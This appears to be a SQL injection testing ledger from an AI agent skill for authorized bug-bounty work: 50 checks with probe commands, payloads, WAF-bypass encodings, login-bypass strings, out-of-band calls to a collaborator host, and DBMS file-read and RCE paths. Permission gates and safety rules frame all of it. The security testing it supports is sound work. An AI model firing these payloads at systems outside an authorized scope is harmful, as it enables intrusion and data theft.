# SQL Injection: 50-Check Ledger

**Progress:** `[ 0 / 50 assessed ]`

Layout per check: **severity if vulnerable**, execution class(es), tags, subagent, objective, commands, pass/fail, references. SQ-01…SQ-30 are the core list; SQ-31…SQ-50 extend it from PortSwigger labs, OWASP WSTG, PayloadsAllTheThings, pentestmonkey, sqlmap documentation, public HackerOne reports and the community notes supplied with this skill.

Variables: `$T` target origin · `$S` = `.agents/skills/sqli/scripts` · `$E` = `artifacts/sqli/evidence` · `$COLLAB` your own OOB host (Burp Collaborator / interactsh) · `FUZZ` = injection point · `V` = the legitimate original value.
Classes: **D** detect (default) · **P** proof (one scalar: version / current user / database name) · **S** data (schema, rows) · **W** write (any statement that can change data beyond your own record) · **X** server reach (file read/write, command execution, DB-initiated network carrying data). S/W/X need explicit program permission — see SKILL.md.

Status: `PASS` · `FINDING` · `INFO` · `GATED` · `NOT_APPLICABLE` · `BLOCKED`.

Ground rules that apply to every check:
- **Never `OR 1=1` / `OR true` in a sink that might be an UPDATE or DELETE** — it widens the WHERE clause to every row. Use `AND` pairs, arithmetic, concatenation or time.
- **Write sinks** (profile update, registration, settings, delete, any non-GET): balanced payloads only (`--context write`), no comment terminators, no stacked queries, only against your own record.
- Time payloads: ≤ 5 s, one request at a time, uncorrelated subquery forms (evaluated once, not per row).
- Stop at the strongest D/P evidence. Do not enumerate tables or dump rows without class S permission.

Reference shorthands:
- `PS-SQLI` = `https://portswigger.net/web-security/sql-injection`
- `PS-BLIND` = `https://portswigger.net/web-security/sql-injection/blind`
- `PS-UNION` = `https://portswigger.net/web-security/sql-injection/union-attacks`
- `PS-EXAM` = `https://portswigger.net/web-security/sql-injection/examining-the-database`
- `PS-CS` = `https://portswigger.net/web-security/sql-injection/cheat-sheet`
- `WSTG-SQLI` = `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection`
- `WSTG-ORM` = `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection`
- `OWASP-CS` = `https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html`
- `PATT` = `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection`
- `PM` = pentestmonkey SQL injection cheat sheets (`https://pentestmonkey.net/category/cheat-sheet/sql-injection`)
- `SQLMAP` = `https://github.com/sqlmapproject/sqlmap/wiki/Usage`
- `CWE-89` = `https://cwe.mitre.org/data/definitions/89.html`

---

## SQ-A — Injection Point Discovery

### SQ-01 · Single quote in every input field — `HIGH` · D
Tags: `syntax-break` `error` `all-inputs` · Subagent: SQ-A

Send `'`, then its repair `''`. An error (or 500 / blank page / changed result) on `'` that disappears on `''` means the quote reached SQL unescaped. Repeat with `"`, `` ` ``, `\`, `')`, `'))`, `'"`. Cover every visible and hidden field: login, signup, forgot/reset password, recovery, contact, ticket creation, search, filters.

```bash
python3 -I $S/sqli_probe.py --target example.com --url "$T/search?q=FUZZ" --value shoes --families break
python3 -I $S/sqli_payloads.py --families break          # break/repair pairs for Burp Intruder
python3 -I $S/sqli_errors.py artifacts/sqli/responses/    # scan saved responses for DBMS errors
```
- **Fail:** DBMS error or result change on break that the repair clears. **Pass:** identical responses for break and repair across all fields.
- **Refs:** `PS-SQLI` (How to detect SQL injection) · `WSTG-SQLI` · `PATT`

### SQ-02 · URL parameters with boolean payloads — `HIGH` · D
Tags: `url-param` `boolean` · Subagent: SQ-A

The checklist item says "OR 1=1"; use the equivalent **AND pair** on read-only GET endpoints instead (`V AND 1=1` vs `V AND 1=2`, `V' AND '1'='1` vs `V' AND '1'='2`). `OR 1=1` is acceptable only on a confirmed SELECT sink (PortSwigger lab "WHERE clause allowing retrieval of hidden data"), and only to show extra rows of non-sensitive data.

Prioritise parameter names in [sqli_param_names.txt](sqli_param_names.txt) (`id`, `cat`, `item_id`, `sort`, `order`, `filter`, `city_id`, …).

```bash
python3 -I $S/sqli_probe.py --target example.com --url "$T/products?cat=FUZZ" --value Gifts --families boolean,concat
```
- **Fail:** true ≈ baseline, false differs, reproducible twice. **Refs:** `PS-SQLI` (lab: retrieval of hidden data) · `PS-BLIND`

### SQ-03 · HTTP headers: Cookie, User-Agent, Referer, X-Forwarded-For — `HIGH` · D
Tags: `headers` `cookie` `logging-sink` · Subagent: SQ-A

Headers are often written to analytics/audit tables (INSERT) or used for tracking lookups (`Cookie: TrackingId=…` in PortSwigger's blind labs). Inject one header at a time, keep everything else identical. Prefer time and OOB payloads — header sinks rarely change the page.

```bash
python3 -I $S/sqli_probe.py --target example.com --url "$T/" --value xyz --header 'Cookie: TrackingId=FUZZ' --families break,boolean,time
python3 -I $S/sqli_probe.py --target example.com --url "$T/" --value 'Mozilla/5.0' --header 'User-Agent: FUZZ' --families time --context write
```
- **Fail:** delay / OOB / boolean signal tied to the header. **Refs:** `PS-BLIND` (TrackingId labs) · HackerOne #297478 (User-Agent SQLi, GSA) · HackerOne "SQL Injection on cookie parameter" (MTN Group)

### SQ-11 · INSERT statements via registration forms — `CRITICAL` · D/W
Tags: `insert` `registration` `write-sink` · Subagent: SQ-A

Registration, contact, ticket and comment forms INSERT. Use **your own new registration** each time, `--context write` (balanced only). A quote that breaks the INSERT typically 500s; a time payload inside a value (`a' AND (SELECT * FROM (SELECT(SLEEP(3)))x) AND 'a'='a`) delays without corrupting other rows. Subquery-in-value (`'||(SELECT 'bbsq')||'`) that shows up concatenated in your profile is strong evidence.
- **Fail:** time/marker signal. **Never** inject extra VALUES tuples or stacked statements.
- **Refs:** `PATT` (Insert statement) · `WSTG-SQLI`

### SQ-12 · UPDATE statements via profile update — `CRITICAL` · D/W
Tags: `update` `profile` `write-sink` · Subagent: SQ-A

The most dangerous context for testers: a comment terminator after a SET value (`x'-- -`) **removes the WHERE clause and updates every user**. Use `--context write` (the probe defaults to it for non-GET), test only your own record, compare your profile before/after.

```bash
python3 -I $S/sqli_probe.py --target example.com --url "$T/api/profile" --data 'displayName=FUZZ' --value myname --families break,time --context write
```
- **Fail:** time signal or your own field receiving a computed value (`0`, `bbsq49`). **Refs:** `PATT` · `OWASP-CS`

### SQ-13 · DELETE statements via record deletion — `CRITICAL` · D/W
Tags: `delete` `write-sink` · Subagent: SQ-A

`sqli_probe.py` refuses the DELETE method. Test manually in Repeater on a **throwaway record you created**: `id=<own>` + ` AND 1=2` (nothing should be deleted if injectable) vs time payload. Never `OR`, never comments. Confirm the record still exists after each false/time test.
- **Fail:** `AND 1=2` prevents deletion while `AND 1=1` deletes (own record), or a time signal. **Refs:** `PATT`

### SQ-24 · JSON parameters in modern APIs — `HIGH` · D
Tags: `json` `api` · Subagent: SQ-A

JSON string values and numbers both: `{"id":"1 AND 1=1"}`, `{"id":1}` → `{"id":"1'"}`. Also try type confusion (`{"id":[1]}`, `{"id":{"$gt":0}}` for ORM/NoSQL) and JSON-operator WAF bypasses (SQ-16).

```bash
python3 -I $S/sqli_probe.py --target example.com --url "$T/api/orders" --json '{"orderId":"FUZZ"}' --value 1001 --context read
```
- **Refs:** `PATT` · Claroty Team82 "JS-ON: Security-OFF" JSON-based WAF bypass research (2022)

### SQ-25 · GraphQL query arguments — `HIGH` · D
Tags: `graphql` · Subagent: SQ-A

Arguments are passed to resolvers that often build SQL (`filter`, `orderBy`, `search`, `where` input objects, IDs). Use variables (`--json` with the variables object) so GraphQL escaping is correct. Check introspection for string arguments named like SQL clauses.

```bash
python3 -I $S/sqli_probe.py --target example.com --url "$T/graphql" --value abc \
  --json '{"query":"query($u:String!){form(uuid:$u){id}}","variables":{"u":"FUZZ"}}' --context read
```
- **Refs:** HackerOne "SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter" (HackerOne) · `api-security` skill

### SQ-32 · Path segments, filenames and parameter names — `HIGH` · D
Tags: `path` `param-name` `rewrite` · Subagent: SQ-A

URL rewriting turns path segments into query values (`/product/39` → `id=39`, `/cat/shoes.html`). Inject in the segment (`/product/39'`, `/product/40-1`), in the extension-less filename (`/SQLPAYLOAD.php` style), and in the **parameter name** itself (`?artist'=1`, `?sort[name']=asc`) — some frameworks interpolate keys into column names.
- **Refs:** nav1n0x notes (payload in filename / param name) · `PATT`

### SQ-33 · XML/SOAP, multipart and file-import fields — `HIGH` · D/W
Tags: `xml` `soap` `multipart` `csv-import` · Subagent: SQ-A

SOAP bodies, XML stock-check APIs, multipart `filename=`, and rows of imported CSV/XLSX files flow into queries. In XML, encode the payload as entities to pass naive filters (`&#x53;ELECT`, see SQ-20). Import tests use a file containing your own data only.
- **Refs:** `PS-SQLI` (lab: filter bypass via XML encoding) · `PATT`

### SQ-34 · Array, HPP and object-key parameters — `HIGH` · D
Tags: `array` `hpp` `php` · Subagent: SQ-A

`countryFilter[]=US'`, `ids[]=1&ids[]=2'`, `filter[name']=x`, duplicated params (`id=1&id=1'`). PHP/Rails array handling may bypass a scalar-only sanitiser or reach an `IN (...)` builder.
- **Refs:** HackerOne "SQL Injection in report_xml.php through countryFilter[] parameter" (Valve) · `PATT`

### SQ-35 · Extended header and metadata sinks — `MEDIUM` · D
Tags: `headers` `analytics` · Subagent: SQ-A

`Host`, `X-Real-IP`, `X-Client-IP`, `True-Client-IP`, `Accept-Language`, `X-Requested-With`, custom tracking headers (`X-Device-Id`, `X-Session-Id`), API keys used for lookup, beacon/analytics endpoints (`/collect`, `/track`). Time/OOB only.
- **Refs:** `PATT` · SQ-03

### SQ-36 · Encoded and wrapped values — `HIGH` · D
Tags: `base64` `jwt` `serialized` · Subagent: SQ-A

Decode → inject → re-encode: base64 / base64url IDs, JSON-in-base64 state blobs, hex, URL-safe tokens, unsigned JWT claims used for lookup (`sub`, `tenant`), serialized cookies. sqlmap supports `--tamper=base64encode` and `--eval` (wrapper refuses `--eval`; re-encode in the request file or Burp instead).
- **Refs:** `PATT` · `session-management` (jwt_inspect.py)

### SQ-37 · Signed / HMAC-protected parameters — `HIGH` · D
Tags: `signature` `payment-callback` · Subagent: SQ-A

Payment callbacks and transaction lookups often sign some fields. Check which fields the signature covers; unsigned fields (or signature checked after the query) are injectable. Never forge a payment outcome — test lookup-only parameters.
- **Refs:** HackerOne "[api.easy2pay.co] SQL Injection at fortumo via TransID parameter [Bypassing Signature Validation]" (Razer)

### SQ-43 · WebSocket, gRPC-web and SSE payloads — `HIGH` · D
Tags: `websocket` `realtime` · Subagent: SQ-A

Messages such as `{"action":"subscribe","room":"V"}` reach SQL just like HTTP params. Replay in Burp's WebSocket Repeater; time payloads are the clearest signal.
- **Refs:** `PS-SQLI` · `idor` ID-29 (WebSocket replay)

---

## SQ-B — Detection Techniques

### SQ-04 · UNION-based with column-count detection — `CRITICAL` · D/P
Tags: `union` `column-count` · Subagent: SQ-B

`ORDER BY n` until an error, or `UNION SELECT NULL,…` until success; then a marker in each column (`(7*60607)` → `424249`) to find displayed columns. Oracle needs `FROM dual`. Stop at the marker (D) or a single `@@version` (P).

```bash
python3 -I $S/sqli_payloads.py --dbms mysql,oracle --contexts sq --families union --max-columns 10
python3 -I $S/sqli_payloads.py --contexts sq --families union --columns 4     # marker per column position
```
- **Refs:** `PS-UNION` (labs: determining number of columns, finding a text column) · `PM`

### SQ-05 · Error-based with DBMS-specific functions — `CRITICAL` · D/P
Tags: `error-based` · Subagent: SQ-B

Make the database compute a marker inside an error: MySQL `EXTRACTVALUE(1,CONCAT(0x7e,'bbsq',7*7))`, PostgreSQL `CAST('bbsq'||7*7 AS INT)`, MSSQL `CONVERT(INT,'bbsq'+CAST(7*7 AS VARCHAR))`, Oracle `CTXSYS.DRITHSX.SN(1,'bbsq'||7*7)`. Finding `bbsq49` proves evaluation; `--proof` then reads the version only.

```bash
python3 -I $S/sqli_probe.py --target example.com --url "$T/item?id=FUZZ" --value 39 --families error --proof
```
- **Refs:** `PS-SQLI` (lab: visible error-based SQL injection) · `PS-CS` · `PM`

### SQ-06 · Blind boolean (AND 1=1 vs AND 1=2) — `HIGH` · D
Tags: `blind` `boolean` · Subagent: SQ-B

The probe sends each true/false pair twice and requires true ≈ baseline, false ≠ baseline, true ≠ false. Also conditional-error variants for pages that never change: `AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1`.
- **Refs:** `PS-BLIND` (labs: conditional responses, conditional errors)

### SQ-07 · Blind time-based (SLEEP, WAITFOR, pg_sleep) — `HIGH` · D
Tags: `blind` `time` · Subagent: SQ-B

Uncorrelated forms only (evaluated once): MySQL `(SELECT * FROM (SELECT(SLEEP(N)))x)`, PostgreSQL `1=(SELECT 1 FROM PG_SLEEP(N))`, MSSQL `; WAITFOR DELAY '0:0:N'` (stacked; read sinks only), Oracle `DBMS_PIPE.RECEIVE_MESSAGE('x',N)`, SQLite heavy `RANDOMBLOB` (last resort). Confirm by scaling: delay at N, longer at N+2, none at 0. Per-row forms from public lists (`' AND SLEEP(5)`, `'XOR(if(now()=sysdate(),sleep(5),0))XOR'`, `BENCHMARK(10000000,…)`) can multiply the delay per row and load the DB — use only when uncorrelated forms fail, with N ≤ 2.

```bash
python3 -I $S/sqli_probe.py --target example.com --url "$T/blind?id=FUZZ" --value 39 --families time --dbms mysql,postgres,mssql,oracle --sleep 3
python3 -I $S/sqli_payloads.py --dbms mysql --families time-extra --sleep 2      # community per-row forms
```
- **Refs:** `PS-BLIND` (labs: time delays, time delays and information retrieval) · `PS-CS`

### SQ-08 · Out-of-band (DNS/HTTP) — `HIGH` · D/P
Tags: `oob` `dns` `async` · Subagent: SQ-B

For asynchronous sinks (queued jobs, logs processed later). Your own collaborator only; payload carries no data (D) or the version only (P). MSSQL `xp_dirtree '\\COLLAB\x'`, Oracle `UTL_INADDR.GET_HOST_ADDRESS` / `EXTRACTVALUE(xmltype(... SYSTEM "http://COLLAB/"))`, PostgreSQL `dblink_connect('host=COLLAB …')`, MySQL `LOAD_FILE('\\\\COLLAB\\a')` (Windows only; class X).

```bash
python3 -I $S/sqli_payloads.py --dbms mssql,oracle,postgres,mysql --contexts sq --families oob --collab "$COLLAB"
```
- **Refs:** `PS-BLIND` (labs: out-of-band interaction / data exfiltration) · `PS-CS` (DNS lookup)

### SQ-15 · Stacked queries with semicolons — `HIGH` · D (read sinks only)
Tags: `stacked` · Subagent: SQ-B

Detect support with a non-mutating second statement only: `; SELECT PG_SLEEP(3)--`, `; WAITFOR DELAY '0:0:3'--`. Support matters for impact (MSSQL/PostgreSQL drivers commonly allow it, MySQL `mysqli_multi_query` / PDO emulation sometimes). Never issue `INSERT`/`UPDATE`/`DROP`/`EXEC` as the stacked statement.
- **Refs:** `PATT` (stacked queries) · `PS-CS`

### SQ-31 · Arithmetic and concatenation inference — `HIGH` · D
Tags: `inference` `no-quote` · Subagent: SQ-B

No quotes, no tautology, works through many WAFs: numeric `id=40-1` returns record 39 (control: `id=40` must differ); string `al'||'ice` (Oracle/PG/SQLite), `al' 'ice` (MySQL), `al'+'ice` (MSSQL) returns the same as `alice`. The probe runs both automatically and identifies the DBMS family from which concatenation works.
- **Refs:** `PS-SQLI` · `PATT` (detection by arithmetic) · `PM`

### SQ-45 · Verbose DB errors and DBMS fingerprinting — `LOW–MEDIUM` · D
Tags: `error-disclosure` `fingerprint` · Subagent: SQ-B

Stack traces with query text, driver names, table/column names. Report as INFO/LOW alone; it guides the other checks (pick DBMS families).

```bash
python3 -I $S/sqli_errors.py --har artifacts/flows/all.har
```
- **Refs:** `WSTG-SQLI` · sqlmap `errors.xml`

### SQ-49 · False-positive elimination and reproducibility — `—` · D
Tags: `confirmation` · Subagent: SQ-B

Before reporting: (1) boolean holds over ≥ 2 rounds and with a second true/false pair (`2=2`/`2=3`); (2) time scales linearly and disappears at 0, not explained by WAF tarpitting or cold caches; (3) error appears with break and clears with repair; (4) the same result reproduces from a clean session. Record exact requests in `$E/`.
- **Refs:** `PS-BLIND` · `SQLMAP` (`--string`, `--not-string`, `--code`, `--text-only`)

---

## SQ-C — Query-Context Injection

### SQ-09 · ORDER BY clause with conditional expressions — `HIGH` · D
Tags: `order-by` `sort` · Subagent: SQ-C

Column names cannot be bound as parameters, so `sort=`/`order=`/`orderBy=` are often concatenated. Test `col ASC` vs `col DESC`, index `1` vs `9999`, then `(CASE WHEN (1=1) THEN col ELSE (SELECT 1 UNION SELECT 2) END)` (true sorts normally, false errors), and a time subquery.

```bash
python3 -I $S/sqli_probe.py --target example.com --url "$T/list?sort=FUZZ" --value name --families orderby
```
- **Refs:** `PATT` (ORDER BY) · `OWASP-CS` (allow-list for identifiers)

### SQ-10 · LIMIT / OFFSET clause — `MEDIUM` · D
Tags: `limit` `pagination` · Subagent: SQ-C

PostgreSQL/SQLite accept expressions (`limit=(SELECT 1)`, `(CASE WHEN 1=1 THEN 1 ELSE 2 END)`); MySQL ≥ 5.6 accepts only constants (old MySQL 5.x: `PROCEDURE ANALYSE(EXTRACTVALUE(...),1)`). Compare against `limit=1`.

```bash
python3 -I $S/sqli_probe.py --target example.com --url "$T/api/items?limit=FUZZ" --value 10 --families limit
```
- **Refs:** `PATT` · `PM` (MySQL)

### SQ-14 · Second-order (stored) injection — `HIGH` · D/W
Tags: `second-order` `stored` · Subagent: SQ-C

Store a payload in your own profile field (username, address, company, file name) that is safely inserted, then trigger the feature that later reuses it in a query (password change by username, reports, admin search, export). Use time/OOB markers with a unique id per field so the trigger can be attributed.
- **Fail:** delay/OOB/error when the second feature runs. **Refs:** `PS-SQLI` (second-order) · `PATT`

### SQ-21 · Stored procedures and functions — `HIGH` · D
Tags: `stored-procedure` `dynamic-sql` · Subagent: SQ-C

Procedures that build dynamic SQL (`EXEC('SELECT … ' + @p)`, `EXECUTE IMMEDIATE`, PL/pgSQL `EXECUTE format(...)` without `%I/%L`) are injectable even when the app calls them with bound parameters. Signals look like any other context; error text often names the procedure.
- **Refs:** `OWASP-CS` (stored procedures are not automatically safe) · `WSTG-SQLI`

### SQ-22 · LIKE clause with wildcards — `MEDIUM` · D
Tags: `like` `search` · Subagent: SQ-C

`%` / `_` returning everything shows unescaped wildcards (INFO/LOW, sometimes data exposure or DoS). Break out with `%' AND '1'='1' AND '%'='` vs `…'1'='2'…`.

```bash
python3 -I $S/sqli_probe.py --target example.com --url "$T/search?q=FUZZ" --value shoe --families like,concat
```
- **Refs:** `PATT` · `OWASP-CS`

### SQ-23 · IN clause with subquery — `HIGH` · D
Tags: `in-clause` `ids` · Subagent: SQ-C

`ids=1,2` → `ids=1,2) AND (1=1` vs `…(1=2`, and `ids=1,(SELECT 1)`. Common in bulk endpoints and filters that accept comma lists.

```bash
python3 -I $S/sqli_probe.py --target example.com --url "$T/api/bulk?ids=FUZZ" --value 1,2 --families in
```
- **Refs:** `PATT`

### SQ-38 · Identifier injection: dynamic column/table/field names — `HIGH` · D
Tags: `identifier` `fields` `group-by` · Subagent: SQ-C

`fields=name,email`, `columns=`, `groupBy=`, `table=`, `export_cols=`, `pivot=` — identifiers are concatenated because they cannot be bound. Test a valid vs invalid column, then a subquery in place of a column (`name,(SELECT 1)`), then a conditional/time expression.
- **Refs:** `OWASP-CS` (identifier allow-listing) · `PATT`

### SQ-39 · API filter languages (OData, RSQL/FIQL, filter DSLs) — `HIGH` · D
Tags: `odata` `filter-dsl` · Subagent: SQ-C

`$filter=Name eq 'x'`, `$orderby=`, `filter[name][like]=`, `q=name==x;age=gt=1`, Strapi/Hasura-style where objects. Break the DSL's quoting first (`x'`), then the SQL beneath it.
- **Refs:** `PATT` · `api-security`

### SQ-40 · ORM and query-builder pitfalls (HQL/JPQL, raw fragments) — `HIGH` · D
Tags: `orm` `hql` `raw-sql` · Subagent: SQ-C

HQL/JPQL injection (Hibernate errors such as `QuerySyntaxException`), Rails `order(params[:sort])` / `where("name = '#{x}'")`, Sequelize `literal`, Django `extra()`/`RawSQL`, Knex `raw`, Prisma `$queryRawUnsafe`, TypeORM `.where(\`...${x}\`)`. HQL has no UNION and no comments in older Hibernate; use boolean/time via native functions (`sleep()` only if mapped).
- **Refs:** `WSTG-ORM` · rails-sqli.org (Rails ORM injection catalogue) · `PATT`

### SQ-41 · Authentication bypass via SQLi on login — `CRITICAL` · D
Tags: `login` `auth-bypass` · Subagent: SQ-C

`yourusername'-- -` with any password logs in **as your own account** only. Do not target `admin` or other users. Detailed login vectors live in `authbypass` (AB checks); log the finding here once proven.
- **Refs:** `PS-SQLI` (lab: login bypass) · `authbypass`

### SQ-44 · Report, export and analytics endpoints — `HIGH` · D
Tags: `reports` `date-range` · Subagent: SQ-C

`period-hour`, `from/to`, `groupBy`, `metric`, `granularity`, `countryFilter`, CSV/XML export filters — reporting code frequently hand-builds SQL. Date params: `2024-01-01'`, `2024-01-01' AND '1'='1`.
- **Refs:** HackerOne "SQL Injection at … cash-card-incomplete-translog-resend via period-hour Parameter" (Razer) · "SQL Injection Extracts Starbucks Enterprise Accounting, Financial, Payroll Database" (Starbucks)

### SQ-48 · Second-order via asynchronous jobs — `HIGH` · D
Tags: `async` `admin-panel` `oob` · Subagent: SQ-C

Values reviewed later by staff tools, nightly reports, CRM syncs or email builders. Plant OOB payloads with unique labels (`bbsq-<field>.$COLLAB`) in your own records and watch for DNS hits for days; correlate the label to the field.
- **Refs:** `PS-BLIND` (OOB) · SQ-14

---

## SQ-D — Filter & WAF Bypass

Check the program policy first: some programs forbid WAF-evasion testing. Never rotate source IPs (proxychains/Tor/rotating proxies) to evade rate limits or bans.

### SQ-16 · SQL comments (`/*!50000SELECT*/`, `--+`, `#`) — `MEDIUM` · D
Tags: `waf` `comments` · Subagent: SQ-D

Inline comments as whitespace (`UNION/**/SELECT`), MySQL versioned comments (`/*!50000UNION*/`), alternative terminators (`--+`, `-- -`, `#`, `%23`, `;%00`). JSON-operator syntax unknown to older WAFs (`' AND JSON_EXTRACT('{"a":1}','$.a')=1-- -`).

```bash
python3 -I $S/sqli_payloads.py --dbms mysql --contexts sq --families boolean,time --transform versioned,comment
python3 -I $S/sqli_probe.py ... --transform comment
```
- **Refs:** `PATT` (WAF bypass) · Reiners' MySQL filter-evasion cheat sheet · sqlmap tampers `space2comment`, `versionedkeywords`, `modsecurityversioned`

### SQ-17 · Case variation (`SeLeCt`, `UnIoN`) — `LOW–MEDIUM` · D
Tags: `waf` `case` · Subagent: SQ-D

`--transform case`. Mostly defeats naive regex filters; combine with SQ-16.
- **Refs:** `PATT` · sqlmap tamper `randomcase`

### SQ-18 · URL-encoding of keywords — `MEDIUM` · D
Tags: `waf` `url-encoding` · Subagent: SQ-D

`--transform url` sends `%53%45%4C%45%43%54` raw (the probe does not re-encode `%` when a raw transform is used). Also encode only the quote (`%27`) or whitespace (`%09`, `%0a`, `%a0`).
- **Refs:** `PATT` · sqlmap tamper `charencode`

### SQ-19 · Double URL encoding — `MEDIUM` · D
Tags: `waf` `double-encoding` · Subagent: SQ-D

`--transform double` (`%2527`, `%2553ELECT`). Works when an inner component decodes again after the WAF.
- **Refs:** `PATT` · sqlmap tamper `chardoubleencode`

### SQ-20 · Unicode / HTML-entity encoding — `MEDIUM` · D
Tags: `waf` `unicode` `entities` · Subagent: SQ-D

`--transform unicode` (IIS `%u0027`), `--transform fullwidth` (`＇` U+FF07, normalised to `'` by NFKC after the filter), `--transform html` (`&#39;` inside XML/HTML-decoded inputs).
- **Refs:** `PS-SQLI` (lab: filter bypass via XML encoding) · sqlmap tampers `charunicodeencode`, `apostrophenullencode`

### SQ-42 · Charset and escaping bypasses — `HIGH` · D
Tags: `wide-byte` `gbk` `escaping` · Subagent: SQ-D

Wide-byte (`%bf%27` / `%df%27` against `addslashes` + GBK/Big5 connections), backslash eating the escape (`\'` → `\\'`), Unicode homoglyph quotes (`ʼ` U+02BC, `＇`) normalised after validation, magic truncation of escaped input at a length limit.
- **Refs:** `PATT` · `PM` (MySQL)

### SQ-47 · Tool-assisted confirmation (sqlmap / ghauri, safe profile) — `—` · D/P
Tags: `sqlmap` `ghauri` · Subagent: SQ-D

Only after a manual signal, pin the parameter and technique: `-p id --technique=BT --dbms=MySQL --level 3 --risk 1|2`. `sqlmap_safe.sh` enforces the scope gate, refuses shells/file write, gates data flags (class S), `--file-read` (X) and `--risk=3`, caps threads and adds a delay. Atlas (m4ll0k) suggests tampers from a blocked payload.

```bash
bash $S/sqlmap_safe.sh example.com -r artifacts/sqli/req_item.txt -p id --technique=BT --level 3 --random-agent -b --current-user
SQLMAP=ghauri bash $S/sqlmap_safe.sh example.com -r artifacts/sqli/req_item.txt -p id --level 3 --batch
```
- **Refs:** `SQLMAP` · ghauri (`https://github.com/r0oth3x49/ghauri`) · Atlas (`https://github.com/m4ll0k/Atlas`)

---

## SQ-E — DBMS-Specific & Impact

Use [dbms_cheatsheet.md](dbms_cheatsheet.md). Each check: fingerprint (P) is in-scope by default; anything marked S/X needs explicit permission.

### SQ-26 · MySQL / MariaDB (information_schema, LOAD_FILE) — `CRITICAL` · P / S / X
Tags: `mysql` · Subagent: SQ-E

P: `@@version`, `CURRENT_USER()`, `DATABASE()`, `@@secure_file_priv`, `SELECT super_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(CURRENT_USER(),'@',1)` (privilege inference). S: `information_schema.tables` (table names only, with permission). X: `LOAD_FILE('/etc/hostname')` only with permission; `INTO OUTFILE`/`DUMPFILE` (web shells) are out of scope.
- **Refs:** `PM` (MySQL) · `PS-EXAM` · WSTG 05.2 Testing for MySQL

### SQ-27 · PostgreSQL (pg_read_file, dblink) — `CRITICAL` · P / S / X
Tags: `postgres` · Subagent: SQ-E

P: `version()`, `current_user`, `current_setting('is_superuser')`, `current_database()`. S: `information_schema.tables`. X: `pg_read_file('/etc/hostname')`, `COPY … FROM PROGRAM` (command execution — out of scope), `dblink`/`lo_import` (OOB/file). Report superuser + stacked queries as the escalation path instead of executing it.
- **Refs:** `PM` (Postgres) · WSTG 05.4 Testing PostgreSQL · `PS-CS`

### SQ-28 · MSSQL (xp_cmdshell, OPENROWSET) — `CRITICAL` · P / X
Tags: `mssql` · Subagent: SQ-E

P: `@@version`, `SYSTEM_USER`, `DB_NAME()`, `IS_SRVROLEMEMBER('sysadmin')`, `SELECT value_in_use FROM sys.configurations WHERE name IN ('xp_cmdshell','Ad Hoc Distributed Queries')`. Do **not** enable or call `xp_cmdshell`, `sp_configure`, `OPENROWSET`/`OPENDATASOURCE` — report sysadmin + stacked queries + config state as the RCE path. `xp_dirtree` to your collaborator is OOB detection (SQ-08); it can also leak the service account NTLM hash — note it, do not capture or relay.
- **Refs:** `PM` (MSSQL) · WSTG 05.3 Testing for SQL Server

### SQ-29 · Oracle (UTL_HTTP, DBMS_LOB) — `CRITICAL` · P / S / X
Tags: `oracle` · Subagent: SQ-E

P: `SELECT banner FROM v$version WHERE ROWNUM=1`, `SELECT user FROM dual`, `SYS_CONTEXT('USERENV','CURRENT_SCHEMA')`. OOB: `UTL_INADDR`, `UTL_HTTP.REQUEST('http://COLLAB/')`, XXE via `EXTRACTVALUE(xmltype(...))` (CVE-2014-6577 class). S/X: `all_tables`, `DBMS_LOB`/`UTL_FILE` file access — gated.
- **Refs:** `PM` (Oracle) · WSTG 05.1 Testing for Oracle · `PS-CS`

### SQ-30 · SQLite (sqlite_master, ATTACH) — `HIGH` · P / S / W
Tags: `sqlite` · Subagent: SQ-E

P: `sqlite_version()` (UNION/boolean only — no verbose error functions). S: `sqlite_master` (schema SQL). W/X: `ATTACH DATABASE '/var/www/x.php' AS x; CREATE TABLE …` writes files — out of scope; report stacked-query support instead. Time: heavy `RANDOMBLOB` / `LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(N))))` — keep N small. Common in mobile backends, Electron apps and embedded devices.
- **Refs:** `PATT` (SQLite) · `PS-CS`

### SQ-46 · Other DBMS (MS Access, DB2, Informix, H2/HSQLDB, ClickHouse, Sybase) — `HIGH` · P
Tags: `access` `db2` `informix` `h2` `clickhouse` · Subagent: SQ-E

Fingerprint from errors (`sqli_errors.py`), then use the DBMS's own syntax: Access (no comments; `IIF`, `MSysObjects`; time via heavy queries), DB2 (`sysibm.sysdummy1`, `versionnumber`), Informix (`systables`, `DBINFO('version','full')`), H2 (`H2VERSION()`; `CREATE ALIAS` = RCE path — do not use), ClickHouse (`version()`, `sleep(3)` max 3 s).
- **Refs:** `PM` (DB2, Informix, Ingres) · nibblesec MS Access SQLi cheat sheet · WSTG 05.5 Testing for MS Access

### SQ-50 · Impact mapping without exploitation — `—` · P (S/X gated)
Tags: `impact` `report` · Subagent: SQ-E

Record for the report, using P-class queries only: DBMS + version, current user, DBA/superuser/sysadmin flag, stacked-query support, file privilege (`secure_file_priv`, `pg_read_server_files` role), DB-initiated egress (OOB), whether the app account can reach other schemas (infer from `current_user` grants, not by listing data). State the realistic worst case (data read across tenants, auth bypass, RCE via xp_cmdshell/COPY PROGRAM) and mark it `GATED` if not proven.
- **Refs:** `WSTG-SQLI` (impact) · `OWASP-CS` · CVSS / program severity guide

---

## Tracker

| ID | Status | Class done | Severity | Evidence |
|---|---|---|---|---|
| SQ-01 … SQ-50 | | | | |
